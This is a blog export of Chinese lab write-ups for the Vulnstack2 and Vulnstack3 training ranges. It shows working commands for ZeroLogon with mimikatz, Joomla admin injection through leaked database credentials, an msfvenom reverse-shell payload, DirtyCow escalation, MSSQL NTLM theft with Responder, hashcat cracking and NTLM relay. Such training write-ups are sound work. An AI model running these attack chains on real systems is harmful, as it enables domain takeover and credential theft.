<h3 id="zerologon-CVE-2020-1472"><a href="#zerologon-CVE-2020-1472" class="headerlink" title="zerologon(CVE-2020-1472)"></a>zerologon(CVE-2020-1472)</h3><p>不是域用户的普通用户就能利用，利用效果：将域控主机administrator的密码置空即null，再利用mimikatz对administrator的ntml进行读取，再用psexec对域控主机进行连接，最后需要用SYSTM权限对置空密码重新赋值</p>
<p>之前nmap探针的时候WEB这台机器开放了3389这个端口，再利用mimikatz抓到的用户密码进行windows远程桌面登录</p>
<p>CS自带的mimikatz没有zerologon的利用模块，于是上传了一个github的最新版到WEB这台机器(其实我是命令打错了mimikatz打成minikatz，我的CS上的mimikatz有zerologon的利用QAQ)</p>
<p>接下来开始利用zerologon漏洞</p>
<p>目前是本地用户非管理员权限（非域用户）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># payload(cs中)</span><br><span class="line"># 查看是否存在zerologon漏洞</span><br><span class="line">mimikatz lsadump::zerologon /target:dc.de1ay.com /account:dc$</span><br><span class="line"></span><br><span class="line"># zerologon漏洞利用</span><br><span class="line">mimikatz lsadump::zerologon /target:dc.de1ay.com /account:dc$ /exploit</span><br><span class="line"></span><br><span class="line"># 读取hash ntlm</span><br><span class="line">mimikatz lsadump::dcsync /domain:de1ay.com /dc:DC /user:administrator /authuser:dc$ /authdomain:de1ay /authpassword:&quot;&quot; /authntlm</span><br><span class="line"></span><br><span class="line"># 重新又设置密码</span><br><span class="line">mimikatz lsadump::postzerologon /target:de1ay.com /account:dc$</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427155143933.png" alt="image-20220427155143933"></p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427155645635.png" alt="image-20220427155645635"></p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427160501418.png" alt="image-20220427160501418"></p>
<p>读取到域控administrator的ntlm是<strong>161cff084477fe596a5db81874498a24</strong></p>
<p>这时候就可以利用psexec进行哈希传递对域控主机DC进行连接（注意这里psexec需要SYSTEM权限）</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427161554169.png" alt="image-20220427161554169"></p>
<p>之后域控这台主机就上线了，到此整个域环境就拿下了</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427161712976.png" alt="image-20220427161712976"></p>
<p>重新赋新的密码</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::postzerologon /target:de1ay.com /account:dc$</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427171643451.png" alt="image-20220427171643451"></p>
<h2 id="域渗透相关命令"><a href="#域渗透相关命令" class="headerlink" title="域渗透相关命令"></a>域渗透相关命令</h2><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">net</span> <span class="keyword">view</span> /domain <span class="comment">//查看域</span></span><br><span class="line"><span class="keyword">net</span> user /domain <span class="comment">//查看域用户</span></span><br><span class="line"><span class="keyword">net</span> group <span class="string">&quot;domain computers&quot;</span> /domain <span class="comment">//查看域内的主机</span></span><br><span class="line"><span class="keyword">net</span> group <span class="string">&quot;domain controllers&quot;</span> /domain <span class="comment">// 查看域控制器组</span></span><br><span class="line"><span class="keyword">net</span> group <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">//查看域管理员组</span></span><br></pre></td></tr></table></figure>



<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="在安装github上找的高版本CS时，服务端teamserver启动报错"><a href="#在安装github上找的高版本CS时，服务端teamserver启动报错" class="headerlink" title="在安装github上找的高版本CS时，服务端teamserver启动报错"></a>在安装github上找的高版本CS时，服务端teamserver启动报错</h3><p>解决：删除cobaltstrike.store文件</p>
<p>参考：<a href="https://github.com/k8gege/Aggressor/issues/5">https://github.com/k8gege/Aggressor/issues/5</a></p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://pan.baidu.com/s/13nU-0vsGBnGejGCKzwphfQ&shfl=sharepset">ATT&amp;CK红队评估实战靶场二</a>    下载密码：<strong>41y6</strong></p>
<p><a href="https://github.com/k8gege/Aggressor/releases/tag/cs">https://github.com/k8gege/Aggressor/releases/tag/cs</a>  下拉到最下面，有cs的下载地址</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全，vulnstack</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnstack3靶场内网渗透</title>
    <url>/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>需要添加一张192.168.93.0/24网段的内网网卡</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230940156.png" alt="image-20220715230940156"></p>
<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715231439922.png" alt="image-20220715231439922"></p>
<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>先用nmap进行探针<code>nmap 192.168.184.0/24</code></p>
<p>探测到在192.168.184.137地址开有web服务</p>
<p>访问如下，发现是Joomla的CMS</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710114851003.png" alt="image-20220710114851003"></p>
<p>利用msf的<code>auxiliary/scanner/http/joomla_version</code>模块探测Joomla版本，发现是3.9.12版本的</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115045397.png" alt="image-20220710115045397"></p>
<p>这就有点棘手了，因为版本很新，网上都是3.4、3.5之类的漏洞，看来是没法直接用，于是去找登录点看看有没有弱口令</p>
<p>有两处登录点，一个是前台<code>http://192.168.184.137/index.php/author-login</code></p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115400615.png" alt="image-20220710115400615"></p>
<p>另一个是后台<code>http://192.168.184.137/administrator/index.php</code>（robots.txt中找到的路径）</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115413169.png" alt="image-20220710115413169"></p>
<p>但是都不存在弱口令，呜呜😭</p>
<p>没辙了等着爆破密码，摆烂了一会儿</p>
<p>这个靶场是和小伙伴一起打的，在我摆烂的时候，小伙伴用dirsearch扫了一下目录，扫出来了一个<code>configuration.php~</code>文件，里面有mysql数据库用户名和密码<code>testuser/cvcvgjASD!@</code>，我直呼牛B！！（害，懒了一下没去扫目录，不能懒啊！）</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120843966.png" alt="image-20220710120843966"></p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120915806.png" alt="image-20220710120915806"></p>
<p>直接用Navicat登录成功，查看<code>umnbt_users</code>表，获得用户名密码<code>admin/$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy</code></p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121138968.png" alt="image-20220710121138968"></p>
<p>这里密码加了密，没办法直接用，去somd5也没有解出来，提示此密文无法识别，真·脑阔疼，又无从下手了</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121340132.png" alt="image-20220710121340132"></p>
<p>这里我想用mysql直接写shell，但是查了文章说需要root权限，完了没辙了，开摆！</p>
<p>这里实在是不会，就去看了一眼攻略，可以自行添加用户进行登录</p>
<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203030913.png" alt="image-20220710203030913"></p>
<p>所以这里payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>

<p>这里有个小坑，我之前找的_users表没找对，<code>umnbt_users</code>不是后台登录的校验表，<code>am2zu_users</code>才是，我之间对着umnbt_users表一顿输出，一直登陆不上，后来才发现表弄错了，真的是烦！</p>
<p>然后终于用admin2/secret登录上了后台</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203534264.png" alt="image-20220710203534264"></p>
<p>用冰蝎连shell发现disable_fuction把命令执行函数都给禁用了，然后采用哥斯拉的bypass命令执行成功</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710213724093.png" alt="image-20220710213724093"></p>
<p>接下来可以利用如下命令做信息收集</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a    # 获取所有版本信息</span><br><span class="line">uname -m    # 获取Linux内核架构</span><br><span class="line">cat /proc/version    # 获取内核信息 </span><br><span class="line">cat /etc/*-release   # 发布信息</span><br><span class="line">cat /etc/issue    # 发布信息</span><br><span class="line">hostname    # 获取主机名</span><br><span class="line"></span><br><span class="line">cat /etc/passwd    # 列出系统所有用户 </span><br><span class="line">cat /etc/group    # 列出系统所有组 </span><br><span class="line">w    # 查看目前登录的用户</span><br><span class="line">whoami    # 查看当前用户 </span><br><span class="line">id    # 查看当前用户信息 </span><br><span class="line">sudo -l    # 列出目前用户可执行与无法执行的指令 </span><br><span class="line"></span><br><span class="line">ps <span class="built_in">aux</span>    # 查看进程信息 </span><br><span class="line">ls -la /etc/cron*    # 查看计划任务</span><br><span class="line">ifconfig -a    # 列出网络接口信息 </span><br><span class="line">cat /etc/network/interfaces    # 列出网络接口信息 </span><br><span class="line">arp -a    # 查看系统arp表 </span><br><span class="line">route    # 打印路由信息</span><br><span class="line">netstat -anplt    # 打印本地端口开放信息 </span><br><span class="line">iptables -L    # 列出iptable的配置规则</span><br></pre></td></tr></table></figure>



<p>这里遇到一个奇怪的地方，当执行ifconfig查看网卡的时候没有之前192.168.184.137这个ip，出现了一个没见过的ip地址192.168.93.120，但我并没有93这个网段的网卡应该是到不了的</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711174311528.png" alt="image-20220711174311528"></p>
<p>这里着实不理解，就去网上看wp了</p>
<p>原来，之前的184.137这台主机并不是真正的web服务器，93.100这台才是，这里是93.100这台web服务器利用184.137这台服务器做了反向代理，在后续渗透查看配置文件的时候也能证明。</p>
<p>网上查找资料说这样做反向代理的目的可以<strong>隐藏服务端真实ip</strong>，另外还说<strong>反向代理可以实现负载均衡</strong></p>
<p>之后根据wp的提示在/tmp/mysql/test.txt中发现了一组用户名密码：wwwuser/wwwuser_123Aqx，猜测应该就是192.168.184.137这台主机ssh的用户和密码。</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204558737.png" alt="image-20220711204558737"></p>
<p>尝试ssh登录成功，ifconfig查看网卡有192.168.184.137和192.168.93.100这两个ip</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711180345893.png" alt="image-20220711180345893"></p>
<p>并且在/etc/nginx/nginx.conf文件中查到如下信息，也证明了之前的说法（93.100这台web服务器利用184.137这台服务器做了反向代理）</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204938381.png" alt="image-20220711204938381"></p>
<p>接下来就是搭代理打内网，看网上文章都在用脏牛提权，我感觉没必要提权也能打内网</p>
<p>这里ew，ssh代理都可以，我选择简单的ssh动态代理<code>ssh -CfNg -D 1080 wwwuser@192.168.184.137</code>，结合proxifier对内网进行渗透</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230354697.png" alt="image-20220711230354697"></p>
<p>这里可以直接访问到内网地址说明代理成功</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230526240.png" alt="image-20220711230526240"></p>
<p>接下来就用fscan进行扫描<code>fscan64.exe -h 192.168.93.1/24 -np -o fscan_result/result93.txt</code>（-np需要加上，因为直接ping不通），发现内网还有10、20、30这三台主机</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711234256330.png" alt="image-20220711234256330"></p>
<p>再用nmap进行更全面的端口扫描</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sT -sV <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -F</span><br><span class="line">-Pn # 扫描之前不需要用<span class="built_in">ping</span>命令，有些防火墙禁止<span class="built_in">ping</span>命令。可以使用此选项进行扫描</span><br><span class="line">-sT # TCP connect（）扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</span><br><span class="line">-sV # 探测端口服务版本</span><br><span class="line">-F # 只扫描在nmap内建的服务文件中已知的端口，如果不致电给，nmap将扫描端口<span class="number">1</span>~<span class="number">1024</span>及包含在nmap-service文件中的所有其他端口</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711235001116.png" alt="image-20220711235001116"></p>
<p>发现存在域<code>test.org</code>，域控为93.10这台服务器，那么接下来的目标就是拿下域控了</p>
<p>进一步的渗透测试交到MSF上进行</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 利用msf生成一个木马，上传到<span class="number">184</span>.<span class="number">137</span>上执行</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line"># 在msf上开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134118908.png" alt="image-20220713134118908"></p>
<p>添加路由如下</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 添加路由</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"># 查看路由</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134631085.png" alt="image-20220713134631085"></p>
<p>添加成功后，利用msf在本地开启socks代理</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SRVHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> SRVPORT <span class="number">1080</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>代理开好后配置/etc/proxychains4.conf文件方便后续使用proxychans4</p>
<p>后面都是参考wp的了，结果还没搞出来，可能是环境问题，只能强行写一下了，记录一下</p>
<blockquote>
<p>有几个打法：<strong>SMB爆破</strong>、<strong>MSSQL NTLM Stealer</strong>、<strong>NTLM Relay</strong>。</p>
</blockquote>
<h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><p>这里是直接根据wp在字典里加的密码，QAQ</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715195130401.png" alt="image-20220715195130401"></p>
<h4 id="MSSQL-NTLM-Stealer"><a href="#MSSQL-NTLM-Stealer" class="headerlink" title="MSSQL NTLM Stealer"></a>MSSQL NTLM Stealer</h4><p>前面探测到<code>192.168.93.20</code>这台机开启了<code>1433</code>端口，尝试进行连接。账号密码则使用前面<code>Joomla CMS</code>那个配置文件中收集到的：<code>testuser / cvcvgjASD!@</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">apt-get install freetds-bin</span><br><span class="line">proxychains4 tsql -S <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U testuser</span><br></pre></td></tr></table></figure>

<p>可以登录</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715194331486.png" alt="image-20220715194331486"></p>
<p>接下来就是在93.100这台服务器上搭建Responder环境</p>
<p>首先下载下面几个工具，</p>
<p>OpenSSL: <a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">https://www.openssl.org/source/openssl-1.1.1g.tar.gz</a></p>
<p>Python3: <a href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz</a></p>
<p>Responder: <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 安装如下</span><br><span class="line"># 注意，这里安装就需要root权限行了，我终于明白看的文章为什么要提权了，这里用脏牛提权就好</span><br><span class="line"></span><br><span class="line">## 脏牛提权</span><br><span class="line">$ git clone https://github.com/FireFart/dirtycow.git</span><br><span class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">$ ./dirty New-Password</span><br><span class="line">$ su firefart</span><br><span class="line"></span><br><span class="line">## 安装OpenSSL</span><br><span class="line">$ tar -zxvf openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g.tar.gz &amp;&amp; <span class="built_in">cd</span> openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g/</span><br><span class="line">$ ./config --prefix=/usr/local/openssl shared zlib</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/openssl/lib&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 我本地测的时候报错说还却sqlite3</span><br><span class="line">## 参考https://www.jianshu.com/p/f32ec5c9bd30</span><br><span class="line">$ wget https://www.sqlite.org/<span class="number">2017</span>/sqlite-autoconf-<span class="number">3170000</span>.tar.gz –no-check-certificate</span><br><span class="line">$ tar zxvf sqlite-autoconf-<span class="number">3170000</span>.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> sqlite-autoconf-<span class="number">3170000</span></span><br><span class="line">$ ./configure --prefix=/usr/local/sqlite</span><br><span class="line">$  make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">## 安装Python3</span><br><span class="line">$ tar -zxvf Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>.tgz &amp;&amp; <span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>/</span><br><span class="line">$ ./configure prefix=/usr/local/python3 --with-openssl=/usr/local/openssl</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;</span><br><span class="line">#配置python</span><br><span class="line">export PYTHON_HOME=/usr/local/python3</span><br><span class="line">export <span class="built_in">PATH</span>=$PYTHON_HOME/bin:$<span class="built_in">PATH</span>&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 测试</span><br><span class="line">$ python3 </span><br><span class="line">&gt;&gt; import ssl</span><br><span class="line">&gt;&gt; import ctypes</span><br><span class="line">&gt;&gt; import sqlite3</span><br><span class="line"># 没有报错即为成功</span><br><span class="line"></span><br><span class="line">## 安装依赖</span><br><span class="line">$ pip3 install netifaces six pycryptodome pycryptodomex</span><br></pre></td></tr></table></figure>

<p>运行Responder</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ python3 Responder.py -I eth1 -Pv</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715204732059.png" alt="image-20220715204732059"></p>
<p>Kali中使用<code>auxiliary/admin/mssql/mssql_ntlm_stealer</code>，执行<code>xp_dirtree</code>，触发UNC</p>
<blockquote>
<p> 配合xp_dirtree存储过程获取运行mssql服务的用户NTLM的hash值,原理是通过LLMNR/NBT-NS欺骗攻击,让MSSQL去访问我们伪造的服务,当MSSQL去执行时就会把它自己的凭证发给我们,我们通过破解它的凭证在返回登录MSSQL,得到最高权限具体操作</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf6&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOSTS <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> SMBPROXY <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> USERNAME testuser</span><br><span class="line">msf6&gt; <span class="built_in">set</span> PASSWORD cvcvgjASD!@</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>

<p>利用成功，此时可以看到已经获取到了NTLMv2-Hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[MSSQL] Received connection from ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Client   : ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:<span class="number">710</span>aa5e90138c34b:F435BDB2083AC31B18639D7013BA94BE:<span class="number">01010000000000009553</span>EC8E1F98D801393FF02331B1CEBF00000000020008004800580045004E0001001E00570049004E002D00360041005600430047004D003300530042004B004B0004003400570049004E002D00360041005600430047004D003300530042004B004B002E004800580045004E002E004C004F00430041004C00030014004800580045004E002E004C004F00430041004C00050014004800580045004E002E004C004F00430041004C00080030003000000000000000000000000030000011C4314A8F10C5B6E59317CE9DBBCF8859B4494BEA8E251FCE09E150BA4F27F40000000000000000</span><br></pre></td></tr></table></figure>

<p>得到NTLMv2后，可以利用hashcat暴力破解</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 查看支持的<span class="built_in">Mode</span>,这里NTLMv2的<span class="built_in">Mode</span>为<span class="number">5600</span></span><br><span class="line">$ hashcat --example-hashes | less</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210758021.png" alt="image-20220715210758021"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 破解</span><br><span class="line">$ hashcat -m <span class="number">5600</span> hash.txt top1000.txt --force</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210830597.png" alt="image-20220715210830597"></p>
<p>这里其实是把wp里的密码加到字典才爆出来的</p>
<h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h4><p>MultiRelay中继攻击</p>
<blockquote>
<p>没爆破出来可以尝试中继Win2008打Win7，发现Win2008的administrator凭据可以中继到Win7，所以可知Win2008和Win7的本地administrator密码相同。参考：<a href="https://xz.aliyun.com/t/6988#toc-4">https://xz.aliyun.com/t/6988#toc-4</a></p>
</blockquote>
<p>运行前需要编译相关工具，这里我在kali完成编译再传到93.100服务器</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ apt-get install gcc-mingw-w64-x86-<span class="number">64</span></span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv</span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode</span><br></pre></td></tr></table></figure>

<p>接下来展开<strong>中继攻击</strong></p>
<blockquote>
<p>所谓中继攻击，就是在两个合法参与方A和B之间进行的一种攻击，中间人C篡改A的消息发送给B或将B的消息篡改发送给A。 C这样做的目的是为了获得A或B的特权，这样C就可以把A的钱通过B的非接触式终端盗走。</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 在<span class="number">93</span>.<span class="number">100</span>服务器执行</span><br><span class="line">## 关闭本地的nginx服务，因为会冲突，启动nginx服务直接输入nginx即可</span><br><span class="line">$ nginx -s stop</span><br><span class="line"></span><br><span class="line">## 禁用SMB和HTTP服务,将对应选项修改为Off</span><br><span class="line">$ vi Responder.conf</span><br><span class="line"></span><br><span class="line">## 开启监听</span><br><span class="line">$ python3 Responder.py -I eth1 -v -F</span><br><span class="line"></span><br><span class="line">## 运行MultiRelay</span><br><span class="line">$ python3 MultiRelay.py -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -u ALL</span><br><span class="line"></span><br><span class="line"># kali执行</span><br><span class="line">## MSSQL触发UNC</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>

<p>可惜我本地测没有成功，说目标没有这个凭证</p>
<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715212639480.png" alt="image-20220715212639480"></p>
<p>所以接下来的步骤都是照抄wp的，太菜了QAQ</p>
<p>此时已经获取到Win7的Shell了，然后使用<code>mimikatz</code>抓取明文密码。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; </span><br><span class="line">mimikatz &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>

<p>还可以通过<code>dump</code>来获得<code>NTLM Hash</code>，存储在<code>Responder/tools/MultiRelay/relay-dumps</code>目录下</p>
